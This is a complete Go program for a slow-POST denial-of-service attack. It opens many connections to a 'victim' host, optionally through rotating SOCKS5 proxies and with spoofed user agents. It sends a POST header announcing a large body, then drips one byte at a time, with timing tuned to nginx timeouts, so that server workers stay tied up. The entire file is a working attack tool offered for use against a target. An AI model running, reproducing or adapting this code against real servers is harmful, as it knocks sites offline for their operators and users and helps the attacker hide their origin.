package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"golang.org/x/net/proxy"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"runtime"
	"time"
)

var (
	contentLength     = flag.Int("contentLength", 1000*1000, "The maximum length of fake POST body in bytes. Adjust to nginx client_max_body_size")
	sockets           = flag.Int("sockets", 1, "The number of workers simultaneously busy with opening new TCP connections")
	sleepInterval     = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx client_body_timeout")
	rampUp            = flag.Duration("ramUp", 10*time.Second, "Ramp up seconds")
	https             = flag.Bool("https", false, "Whether to use tls or not")
	randUserAgent     = flag.Bool("randUserAgent", false, "Randomizes user-agents with each request")
	quiet             = flag.Bool("quiet", false, "Logs or nah")
	destinationHost   = flag.String("destinationHost", "", "Victim's url. Http POST must be allowed in nginx config for this url")
	destinationPort   = flag.String("destinationPort", "", "Victim's port.")
	hostHeader        = flag.String("hostHeader", *destinationHost, "Host header value in case it is different than the hostname in victimUrl")
	proxyPath         = flag.String("proxyPath", "", "SOCKS5 proxy port")
)

var (
	sharedReadBuf  = make([]byte, 4096)
	sharedWriteBuf = []byte("A")
	tlsConfig = &tls.Config{
		InsecureSkipVerify: true,
	}
	userAgents     = []string{
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
	}
)

func main() {

	runtime.GOMAXPROCS(runtime.NumCPU())
	rand.Seed(time.Now().UTC().UnixNano())

	flag.Parse()
	flag.VisitAll(func(f *flag.Flag) {
		fmt.Printf("%s=%v\n", f.Name, f.Value)
	})

	if *quiet {
		devNull, err := os.Open(os.DevNull)
		if err != nil {
			panic(fmt.Sprintf("Damn, how did this happen: [%s]", err))
		}
		os.Stdout = devNull
	}

	if len(*destinationPort) == 0 {
		if *https {
			*destinationPort = "443"
		} else {
			*destinationPort = "80"
		}
	}

	destinationHostPort := net.JoinHostPort(*destinationHost, *destinationPort)

	proxyList := generateProxyList(*proxyPath)
	for i:= 1 ; i <= *sockets ; i++ {
		proxyHostPort := ""
		if len(proxyList) != 0 {
			proxyHostPort = proxyList[rand.Intn(len(proxyList))]
		}
		requestHeader := generateRequestHeader(destinationHostPort)

		go dialWorker(destinationHostPort, proxyHostPort, requestHeader)
		log.Printf("Worker: [%d] started. RequestHeader: [%s]", i, requestHeader)
		time.Sleep(*rampUp)
	}
	select {}
}

func generateRequestHeader(uri string) []byte  {
	userAgent := ""
	if *randUserAgent {
		userAgent = "\nUser-Agent: " + userAgents[rand.Intn(len(userAgents))]
	}
	if len(*hostHeader) == 0 {
		*hostHeader = uri
	}
	return []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s%s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n", uri, *hostHeader, userAgent, *contentLength))
}

func generateProxyList(path string) (lines []string) {
	if len(path) == 0 {
		return
	}

	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("Cannot open [%s]: [%s]\n", path, err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxyHostPort := scanner.Text()
		lines = append(lines, proxyHostPort)
	}
	return

}

func dialWorker(destinationHostPort, proxyHostPort string, requestHeader []byte) {
	for {
		conn := dialDestination(destinationHostPort, proxyHostPort)
		if conn != nil {
			go doLoris(conn, requestHeader)
		}
	}
}

func dialDestination(destinationHostPort, proxyHostPort string) io.ReadWriteCloser {
	var conn net.Conn
	var err error

	if len(proxyHostPort) == 0 {
		conn, err = net.Dial("tcp", destinationHostPort)
	} else {
		dialer, _err := proxy.SOCKS5("tcp", proxyHostPort, nil, proxy.Direct)
		if _err != nil {
			log.Printf("Couldn't setup proxy to [%s]: [%s]\n", proxyHostPort, err)
			return nil
		}
		log.Printf("Connected to proxy: [%s]\n", proxyHostPort)
		conn, err = dialer.Dial("tcp", destinationHostPort)
	}

	if err != nil {
		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", destinationHostPort, err)
		return nil
	}
	log.Printf("Connected to destination: [%s]\n", destinationHostPort)

	tcpConn := conn.(*net.TCPConn)
	if err = tcpConn.SetReadBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
	}
	if err = tcpConn.SetWriteBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
	}
	if err = tcpConn.SetLinger(0); err != nil {
		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
	}
	if !*https {
		return tcpConn
	}

	tlsConn := tls.Client(conn, tlsConfig)
	if err = tlsConn.Handshake(); err != nil {
		conn.Close()
		log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", destinationHostPort, err)
		return nil
	}
	return tlsConn
}

func doLoris(conn io.ReadWriteCloser, requestHeader []byte) {
	defer conn.Close()

	if _, err := conn.Write(requestHeader); err != nil {
		log.Printf("Cannot write requestHeader=[%v]: [%s]\n", requestHeader, err)
		return
	}

	readerStopCh := make(chan int, 1)
	go nullReader(conn, readerStopCh)

	for i := 0; i < *contentLength; i++ {
		select {
		case <-readerStopCh:
			return
		case <-time.After(*sleepInterval):
		}
		if _, err := conn.Write(sharedWriteBuf); err != nil {
			log.Printf("Error when writing %d byte out of %d bytes: [%s]\n", i, *contentLength, err)
			return
		}
	}
}

func nullReader(conn io.Reader, ch chan<- int) {
	defer func() { ch <- 1 }()
	n, err := conn.Read(sharedReadBuf)
	if err != nil {
		log.Printf("Error when reading server response: [%s]\n", err)
	} else {
		log.Printf("Unexpected response read from server: [%s]\n", sharedReadBuf[:n])
	}
}